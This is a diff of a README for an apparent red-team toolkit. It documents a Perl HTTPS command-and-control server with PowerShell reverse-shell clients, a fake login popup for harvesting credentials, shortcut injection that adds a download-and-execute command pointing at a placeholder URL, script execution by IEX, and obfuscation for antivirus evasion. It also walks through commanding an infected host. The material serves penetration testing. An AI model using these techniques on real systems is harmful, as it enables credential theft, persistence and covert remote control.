@@ -6,16 +6,151 @@ A collection of tools personalized for red teams but also useful for pen testers
 * Custom HTTPS capable C2 server written in Perl and powershell reverse shells the "async-client and variants".
 * Simple Windows script obfuscator for AV evasion.
 
-#### async-shell-handler
+# async-shell-handler
+asynchronous multi-shell handler
 
-Provides a prototype C&C web server along with an asynchronous powershell client, and a basic command interface.
-The server is hosted on an lighttpd server using HTTPS with a self-signed certificate. Since the C&C is a cgi hosted on a lighttpd server you can edit the included lighttpd.conf to only allow connections from the expected IP range.
+Includes a server side cgi application and a powershell client.
+It performs handeling of systems that have executed the async-client
+script. This allows the individual running the server hosting the
+cgi to enter shell commands to be executed by clients asynchronously.
 
-The async client performs basic key fingerprint comparison for the self-signed cert and basic authentication to the C&C. These values are randomly generated upon installation. All requests and responses from the client are performed via HTTPS GET requests with url safe base64 encoded strings.
+The information is exchanged in an encoded format, the secure nature
+directly relies upon the use of SSL/TLS.
 
-The client initially operates in memory so if it exits or the system reboots the process will be terminated and flushed from memory.
+# Install
 
-Persistence has been added via the shortcut-inject and simple-persistence functions avaliable in the async and tcp powershell clients.
+Developed for use on a regular Ubuntu 14.04 LTS server distro.
+To get it working run the installer as root.
+
+```
+ ./install.sh
+```
+
+## use
+
+The info of individual systems is stored in /var/async-shell/systems and is 
+assigned to www-data as owner and group.
+
+### cli.pl
+
+This provides a basic command shell to interact with systems running
+the client.
+
+To have the server host powershell scripts to be loaded using the exec-script
+function place them in /var/async-shell/ps-scripts with to correct permissions
+www-data as owner and group.
+
+Additional functions have been added to the client that can be called within 
+a shell session.
+
+* show-help                                              
+shows the following function info from a shell session. 
+
+* get-info                       
+Displays a summary of current host
+
+* exec-script "name-of-script"  
+Executes script hosted server side in /var/async-shell/ps-scripts by IEX 
+requires the name of the script filename as a parameter.
+
+* obfuscate "name of text file / script"                                    
+Uses a polyalphabetic obfuscation method on base64 strings writes obfuscated
+string to file and provides a de-obfuscation key.
+
+* de-obfuscate "(name of text file / script), (key)"                            
+Performs the inverse of the obfuscation function requires the text file with the
+obfuscated base64 data and de-obfuscation key as parameters.
+
+* gen-key                                                                      
+generates a random alphabetic string for use with the obfuscate-base64 function.
+
+* obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)"
+The function that contains the obfuscation engine, it works only with clear base64 data.
+
+* byte-encode ( binary-to-obfuscate, key )                                                
+Performs byte-encoding prior to converting to obfuscated base64 provide key de-obfuscation.
+
+* byte-decode ( file-containing-obfu-base64, key )                                    
+performs the reverse of byte-encode, requires the de-obfuscation key.
+
+* askfor-creds                                                                         
+Performs some social engineering inorder to aquire plain-text credentials. This is done
+by generating a authentication popup which seems to reconnect to a network share.
+
+* gen-enccmd "your command string"                                                  
+Generates a PowerShell formatted encoded command. Insure to quote your command
+string.
+
+```
+gen-enccmd "cmd /c ipconfig /all"
+```
+
+* shortcut-inject "name-of-lnk" "Url-hosting-script"                                   
+Modifies the specified shortcut to run the original program and also execute a download
+and execute command string. Ex: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
+Requires the http:// or https:// in the URL.
+
+
+### caveats
+Depending on your command structure and use of special characters you may need
+to encapsulate your command string in a variable before passing to this function.
+```
+$cmdstring = 'cmd /c ipconfig /all' ; gen-enccmd $cmdstring
+```
+
+* dec-enccmd [Your encoded command string ]
+Decodes the base64 string and displays the original string.
+
+Note: depending on the command executed by the client there may be no
+stdout, this will leave the client hanging expecting a response and you 
+will have to restart it to reset it.
+
+to use just run
+```
+./cli.pl
+```
+to exit ctrl-c
+
+If you feel this is a bit too unpredictable you will have to 
+use echo and tail.
+
+```
+null-pc www # ls -l /var/
+drwxr-xr-x  2 www-data www-data 4096 Sep 15 00:22 systems
+```
+
+Inside this folder will contain the hostname of the machine runing the
+powershell client script.
+
+This will create a folder named after the hostname and it's mac
+address.
+
+```
+null-pc systems # ls -l
+drwxr-xr-x 2 www-data www-data 4096 Sep 15 00:46 ZERO-PC-08-00-27-30-15-25
+```
+
+In this folder will be two files named command and stdout. Their names 
+denote their purpose.
+
+```
+null-pc ZERO-PC-08-00-27-30-15-25 # ls -l
+-rw-r--r-- 1 www-data www-data  7 Sep 15 00:46 command
+-rw-r--r-- 1 www-data www-data 15 Sep 15 00:46 stdout
+null-pc ZERO-PC-08-00-27-30-15-25 # echo 'dir' > command 
+null-pc ZERO-PC-08-00-27-30-15-25 # tail -f stdout 
+
+    Directory: C:\Users\zero\Desktop
+
+
+Mode                LastWriteTime     Length Name                                                                           
+----                -------------     ------ ----                                                                           
+-a---         9/17/2015   6:14 PM      11378 basic-macro-test.docx                                                 
+-a---         9/17/2015   6:58 PM      11376 test-self-signed-iex.docx                                                        
+```
+Created to be used along with gen-obfuscated
+
+For more info http://nightowlconsulting.com/asynchronous-shell-handler/
 
 #### gen-obfuscated
 
@@ -48,7 +183,7 @@ A variant of gen-obfuscated ported to powershell. The obfuscation engine is port
 
 made to run from a windows systems to generate payloads without needing to use the powershell clients/implants. 
 
-### The boot2own toolkit
+# The boot2own toolkit
 
 B2O is a toolkit that generates a live OS from a crunchbang 
 iso. When a workstation is booted to this live environment 
